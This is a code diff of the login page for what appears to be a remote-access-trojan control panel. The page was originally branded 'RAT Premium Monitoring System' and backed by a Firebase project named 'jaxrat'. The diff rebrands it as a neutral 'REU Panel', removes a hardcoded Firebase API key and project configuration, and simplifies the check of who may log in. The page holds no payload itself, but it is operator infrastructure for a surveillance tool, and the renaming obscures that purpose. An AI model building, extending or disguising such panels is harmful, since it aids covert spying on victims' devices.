@@ -1,186 +1,66 @@
+<!-- Path: /panel/index.html -->
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - RAT Premium</title>
-    <link rel="stylesheet" href="css/style.css">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
-        .container { width: 100%; max-width: 400px; padding: 20px; }
-        .login-card { background: white; border-radius: 10px; padding: 40px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); }
-        .logo h1 { font-size: 28px; color: #333; margin-bottom: 5px; }
-        .logo h1 span { color: #667eea; font-size: 14px; margin-left: 5px; }
-        .logo p { color: #666; margin-bottom: 30px; }
-        .form-group { margin-bottom: 20px; }
-        .form-group label { display: block; margin-bottom: 5px; color: #555; font-size: 14px; }
-        .form-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 14px; }
-        .form-group input:focus { outline: none; border-color: #667eea; }
-        .btn-login { width: 100%; padding: 12px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border: none; border-radius: 5px; color: white; font-size: 16px; cursor: pointer; transition: opacity 0.3s; }
-        .btn-login:hover { opacity: 0.9; }
-        .btn-login:disabled { opacity: 0.5; cursor: not-allowed; }
-        .alert { padding: 12px; border-radius: 5px; margin-bottom: 20px; font-size: 14px; }
-        .alert-error { background: #fee; color: #c33; border: 1px solid #fcc; }
-        .footer-note { margin-top: 30px; text-align: center; color: #666; font-size: 13px; }
-        .footer-note .small { font-size: 11px; color: #999; margin-top: 5px; }
-        .loading-spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; margin-right: 8px; vertical-align: middle; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-    </style>
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+    <title>REU Panel • Login</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
 </head>
 <body>
-    <div class="container">
+    <div class="login-container">
         <div class="login-card">
-            <div class="logo">
-                <h1>🔮 RAT<span>Premium</span></h1>
-                <p>Monitoring System v5.0</p>
-            </div>
-            
-            <div id="errorMessage" class="alert alert-error" style="display: none;"></div>
+            <h1>🔐 REU Panel <span>v3.0</span></h1>
+            <p class="subtitle">Masuk dengan akun Firebase-mu</p>
             
             <form id="loginForm">
-                <div class="form-group">
-                    <label for="email">Email Firebase</label>
-                    <input type="email" id="email" placeholder="contoh@email.com" required>
+                <div class="input-group">
+                    <label>Email</label>
+                    <input type="email" id="email" placeholder="email@example.com" required>
                 </div>
-                
-                <div class="form-group">
-                    <label for="password">Password</label>
+                <div class="input-group">
+                    <label>Password</label>
                     <input type="password" id="password" placeholder="••••••••" required>
                 </div>
-                
-                <button type="submit" class="btn-login" id="loginBtn">
-                    <span>🔓 Login ke Panel</span>
-                </button>
+                <button type="submit" class="btn-login">Login ke Panel</button>
             </form>
             
-            <div class="footer-note">
-                <p>Login menggunakan akun yang diberikan oleh @deakfta</p>
-                <p class="small">⚠️ Pastikan koneksi aman</p>
-            </div>
+            <div id="errorMessage" class="error hidden"></div>
         </div>
     </div>
-    
+
+    <script src="firebase-config.js"></script>
     <script>
-        // Firebase Config
-        const firebaseConfig = {
-            apiKey: "AIzaSyDzA92c3IoyjhiFft3Ci6cpsvEJBXAzIfQ",
-            authDomain: "jaxrat-6813c.firebaseapp.com",
-            databaseURL: "https://jaxrat-6813c-default-rtdb.firebaseio.com",
-            projectId: "jaxrat-6813c",
-            storageBucket: "jaxrat-6813c.firebasestorage.app",
-            messagingSenderId: "750985295231",
-            appId: "1:750985295231:web:0679d4b998e52256e4d64a"
-        };
-
-        // Initialize Firebase
-        firebase.initializeApp(firebaseConfig);
-
-        // CEK SESSION SEBELUM LOAD PAGE
-        (function() {
-            // Cek apakah sudah login dari sebelumnya
-            const isLoggedIn = sessionStorage.getItem('isLoggedIn');
-            if (isLoggedIn === 'true') {
-                // Redirect ke dashboard langsung
-                window.location.replace('dashboard.html');
-                return;
-            }
-            
-            // Cek Firebase current user
-            firebase.auth().onAuthStateChanged(function(user) {
-                if (user) {
-                    // Ada user, cek akses
-                    firebase.database().ref(`users/${user.uid}`).once('value')
-                        .then((snapshot) => {
-                            if (snapshot.exists()) {
-                                sessionStorage.setItem('isLoggedIn', 'true');
-                                sessionStorage.setItem('userUid', user.uid);
-                                window.location.replace('dashboard.html');
-                            } else {
-                                // Ga punya akses, logout
-                                firebase.auth().signOut();
-                                sessionStorage.removeItem('isLoggedIn');
-                            }
-                        });
-                }
-            });
-        })();
-
-        // Handle Login Form
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
-            const email = document.getElementById('email').value.trim();
+            const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-            const loginBtn = document.getElementById('loginBtn');
             const errorDiv = document.getElementById('errorMessage');
             
-            // Validation
-            if (!email || !password) {
-                errorDiv.style.display = 'block';
-                errorDiv.textContent = 'Email dan password harus diisi!';
-                return;
-            }
-            
-            // Disable button
-            loginBtn.disabled = true;
-            loginBtn.innerHTML = '<span class="loading-spinner"></span> <span>Processing...</span>';
-            errorDiv.style.display = 'none';
-            
             try {
-                // Sign in to Firebase
-                console.log('Attempting login with:', email);
-                const userCredential = await firebase.auth().signInWithEmailAndPassword(email, password);
+                const userCredential = await auth.signInWithEmailAndPassword(email, password);
                 const user = userCredential.user;
-                console.log('Login success, UID:', user.uid);
                 
-                // Cek akses ke database
-                console.log('Checking access...');
-                const snapshot = await firebase.database().ref(`users/${user.uid}`).once('value');
-                const ownerSnapshot = await firebase.database().ref('settings/owner_uid').once('value');
+                // Cek apakah user terdaftar di database
+                const userRef = db.ref('settings/users_db/' + user.uid);
+                const snapshot = await userRef.once('value');
                 
-                if (snapshot.exists() || user.uid === ownerSnapshot.val()) {
-                    // Simpan session
-                    sessionStorage.setItem('isLoggedIn', 'true');
-                    sessionStorage.setItem('userUid', user.uid);
-                    sessionStorage.setItem('userEmail', user.email);
-                    
-                    console.log('Access granted, redirecting...');
-                    
-                    // FORCE REDIRECT dengan timeout minimal
-                    setTimeout(() => {
-                        window.location.replace('dashboard.html');
-                    }, 100);
-                    
+                if (snapshot.exists() || user.uid === 'OWNER_UID_MU') {
+                    // Redirect ke dashboard dengan data user
+                    window.location.href = `dashboard.html?uid=${user.uid}`;
                 } else {
-                    // Ga punya akses
-                    console.log('Access denied');
-                    await firebase.auth().signOut();
-                    sessionStorage.removeItem('isLoggedIn');
-                    throw new Error('Akun tidak memiliki akses premium');
+                    errorDiv.textContent = 'Akun tidak terdaftar. Hubungi owner.';
+                    errorDiv.classList.remove('hidden');
                 }
-                
             } catch (error) {
-                console.error('Login error:', error);
-                
-                // Tampilkan error
-                errorDiv.style.display = 'block';
-                errorDiv.textContent = error.message;
-                
-                // Enable button
-                loginBtn.disabled = false;
-                loginBtn.innerHTML = '<span>🔓 Login ke Panel</span>';
+                errorDiv.textContent = 'Email atau password salah!';
+                errorDiv.classList.remove('hidden');
             }
         });
-
-        // Prevent form resubmission on refresh
-        if (window.history.replaceState) {
-            window.history.replaceState(null, null, window.location.href);
-        }
     </script>
 </body>
 </html>
